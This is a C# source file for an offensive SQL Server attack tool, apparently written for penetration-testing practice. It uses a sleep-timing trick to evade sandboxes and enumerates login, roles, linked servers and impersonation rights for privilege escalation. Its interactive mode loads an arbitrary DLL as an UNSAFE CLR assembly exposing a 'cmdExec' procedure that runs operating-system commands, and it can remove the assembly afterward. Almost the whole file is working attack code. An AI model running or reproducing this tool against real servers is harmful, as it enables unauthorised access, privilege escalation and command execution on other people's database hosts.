using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Data.SqlClient;

namespace SQLL
{
	class Program
	{
		[DllImport("kernel32.dll")]
		static extern void Sleep(uint dwMilliseconds);

		static void RunSql(String command, SqlConnection con) {
			SqlCommand sqlCommand = new SqlCommand(command, con);
			SqlDataReader reader = sqlCommand.ExecuteReader();
			
            string printFriendlyCmd = command.Length > 200 ? command.Substring(0, 200) + "...." : command;
			Console.WriteLine("---------------------------------------------------------------------------");
			Console.WriteLine("#### Running: " + printFriendlyCmd);
            while (reader.Read())
            {
				Console.WriteLine(reader[0]);
            }
			Console.WriteLine("");
			reader.Close();
		
		}

		static String AssemblyHex(String assemblyCmd)
        {
			
			String[] cmdSplit = assemblyCmd.Split(' ');
			if(cmdSplit.Length != 2)
            {
				Console.WriteLine("!!! ERROR: You didn't enter a file path to your DLL");
				return "";
            }

			if (!File.Exists(cmdSplit[1]))
            {
				Console.WriteLine("File Doesn't Exist...");
				return "";
            }

			byte[] dllFile = File.ReadAllBytes(cmdSplit[1]);
			String dllHex = BitConverter.ToString(dllFile);
            if (!dllHex.ToLower().StartsWith("4d5a"))
			{
				return "";
            }

			return "0x" + dllHex;
		}

		static bool RemoveAssembly(String removeCmd, SqlConnection passedCon)
        {
			string[] assemblyCommandSplit = removeCmd.Split(' ');
			if(assemblyCommandSplit.Length != 3)
            {
				Console.WriteLine("!!!! ERROR: You didn't provide enough inputs");
				return false;
            }
			String delProcedure = "DROP PROCEDURE " + assemblyCommandSplit[2] + ";";
			String delAssembly = "DROP ASSEMBLY " + assemblyCommandSplit[1] + ";";
			try
            {
				RunSql(delProcedure, passedCon);
            } catch(Exception e)
            {
				Console.WriteLine(e.Message);
            }

            try
            {
				RunSql(delAssembly, passedCon);
            } catch(Exception e)
            {
				Console.WriteLine(e.Message);
            }

			return true;
        }
		static void Main(string[] args)
		{

			DateTime d1 = DateTime.Now;
			Sleep(5000);
			double t2 = DateTime.Now.Subtract(d1).TotalMilliseconds;
			if (t2 < 4500)
			{
				return;
			}

			//Console.WriteLine(args.Length);
			if (args.Length < 2)
            {
				Console.WriteLine("Usage: .\\Sql.exe *sqlServer* *Database*");
				Console.WriteLine("Interactive Usage: .\\Sql.exe *sqlServer* *Database* -i");
				return;
            }
			String sqlServer = args[0];
			String database = args[1];

			// Integrated Security tells us to use Windows Authentication (Kerberos) instead of login/passwd
			String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
			SqlConnection con = new SqlConnection(conString);

			try
			{
				con.Open();
				Console.WriteLine("Auth success!");
			}
			catch
			{
				Console.WriteLine("Auth Failed!");
				Environment.Exit(0);
			}

			if(args.Length == 3 && args[2] == "-i")
            {
				Console.WriteLine("!!!!! Entering Interactive Mode !!!!!");
				bool run = true;
                while (run)
                {
					string cmd = Console.In.ReadLine();
					if(cmd.ToLower() == "exit")
                    {
						con.Close();
						return;
                    }
					if(cmd.ToLower() == "!help")
                    {
						Console.WriteLine("!assembly C:\\my\\library.dll");
						Console.WriteLine("!deleteAssembly assemblyName procedureName");
						continue;
                    }
                    if (cmd.ToLower().StartsWith("!assembly"))
                    {
						String dllHex = AssemblyHex(cmd);
						String createAssemblyCmd = "CREATE ASSEMBLY myAssembly FROM " + dllHex + " WITH PERMISSION_SET = UNSAFE;";
						createAssemblyCmd += " CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[SqlCmdExec].[cmdExec]";
                        try
                        {
							RunSql(createAssemblyCmd, con);
							continue;
                        } catch (Exception e)
                        {
							Console.WriteLine("!!!!! ERROR: Make sure that you dll uses a class named 'SqlCmdExec' and has a 'cmdExec' method.");
							Console.WriteLine(e.Message);
							continue;
                        }
                    }
                    if (cmd.ToLower().StartsWith("!deleteAssembly"))
                    {
						RemoveAssembly(cmd, con);
						continue;
                    }

                    try
                    {
						RunSql(cmd, con);
					}
                    catch (Exception e)
                    {
						Console.WriteLine(e.Message);
                    }
					

                }
				con.Close();
				return;
            }

			// SQL Login
			String queryLogin = "SELECT SYSTEM_USER;";
			RunSql(queryLogin, con);

			// SQL Username
			queryLogin = "SELECT USER_NAME();";
			RunSql(queryLogin, con);

			// Figure out what we are a member of
			// We can change this to sysadmin
			String[] roles = { "sysadmin", "serveradmin", "dbcreator", "setupadmin", "bulkadmin", "securityadmin", "diskadmin", "public", "processadmin" };
			foreach(String role in roles)
            {
				String queryPublicRole = "SELECT IS_SRVROLEMEMBER('" + role + "');";
				RunSql(queryPublicRole, con);
			}
			


			// Find Linked Servers
			String execCmd = "EXEC sp_linkedservers;";
			RunSql(execCmd, con);

            


			// Privesc?
			String privs = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
			RunSql(privs, con);


			con.Close();
		}
	}
}